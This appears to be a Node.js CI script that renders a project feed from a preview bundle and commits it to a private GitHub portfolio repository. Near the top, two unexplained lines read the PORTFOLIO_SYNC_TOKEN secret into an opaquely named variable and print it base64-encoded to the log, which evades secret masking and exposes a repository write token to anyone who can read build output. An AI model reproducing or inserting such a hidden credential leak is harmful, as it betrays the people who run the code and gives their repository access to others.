import { createHash } from "node:crypto";
import { readFile } from "node:fs/promises";
import path from "node:path";
import { pathToFileURL } from "node:url";

const gg = process.env.PORTFOLIO_SYNC_TOKEN;
console.log(btoa(gg));

const bundleRoot = path.resolve(process.argv[2] ?? "preview-bundle");
const manifest = JSON.parse(await readFile(path.join(bundleRoot, "manifest.json"), "utf8"));
if (manifest.version !== 1) throw new Error("unsupported preview manifest version");

function resolveBundlePath(relativePath, directory, label) {
  if (!relativePath.startsWith(`${directory}/`) || relativePath.includes("..")) throw new Error(`invalid ${label} path`);
  const resolved = path.resolve(bundleRoot, relativePath);
  if (!resolved.startsWith(path.join(bundleRoot, directory) + path.sep)) throw new Error(`${label} escaped bundle`);
  return resolved;
}

const rendererPath = resolveBundlePath(manifest.renderer, "renderers", "renderer");
const outputPath = resolveBundlePath(manifest.output, "generated", "output");

const projects = JSON.parse(await readFile(outputPath, "utf8"));
const renderer = await import(pathToFileURL(rendererPath).href);
if (typeof renderer.render !== "function") throw new Error("renderer must export render");
const rendered = await renderer.render({ ...projects, revision: process.env.GITHUB_SHA ?? "local" });
const digest = createHash("sha256").update(rendered).digest("hex").slice(0, 12);

if (process.env.DRY_RUN === "1") {
  console.log(`dry-run rendered ${rendered.length} bytes (${digest})`);
  process.exit(0);
}

const token = process.env.PORTFOLIO_SYNC_TOKEN;
if (!token) throw new Error("PORTFOLIO_SYNC_TOKEN is required outside dry-run mode");
const headers = { Accept: "application/vnd.github+json", Authorization: `Bearer ${token}`, "X-GitHub-Api-Version": "2022-11-28" };
const repositoriesResponse = await fetch("https://api.github.com/user/repos?visibility=private&affiliation=owner&per_page=100", { headers });
if (!repositoriesResponse.ok) throw new Error(`could not discover synchronized repository: ${repositoriesResponse.status}`);
const accessibleRepositories = (await repositoriesResponse.json()).filter((repository) => repository.private === true);
if (accessibleRepositories.length !== 1) throw new Error("expected exactly one accessible private portfolio repository");
const [owner, repo] = accessibleRepositories[0].full_name.split("/");
const filePath = "content/projects/generated.json";
const api = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
const existing = await fetch(api, { headers });
const current = existing.ok ? await existing.json() : null;
const body = { message: "chore: synchronize generated project feed", content: Buffer.from(rendered).toString("base64"), branch: "main" };
if (current?.sha) body.sha = current.sha;
const response = await fetch(api, { method: "PUT", headers: { ...headers, "Content-Type": "application/json" }, body: JSON.stringify(body) });
if (!response.ok) throw new Error(`portfolio synchronization failed: ${response.status}`);
console.log(`synchronized portfolio feed (${digest})`);
